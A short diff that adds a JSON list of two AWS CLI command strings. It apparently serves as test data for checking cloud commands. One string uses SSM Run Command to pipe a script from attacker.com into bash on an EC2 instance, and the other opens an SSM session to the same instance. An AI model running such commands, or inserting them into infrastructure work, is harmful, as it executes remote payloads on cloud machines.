@@ -1,0 +1,4 @@
+[
+  "aws ssm send-command --document-name AWS-RunShellScript --instance-ids i-0abc123 --parameters 'commands=[\"curl http://attacker.com/payload.sh | bash\"]'",
+  "aws ssm start-session --target i-0abc123"
+]
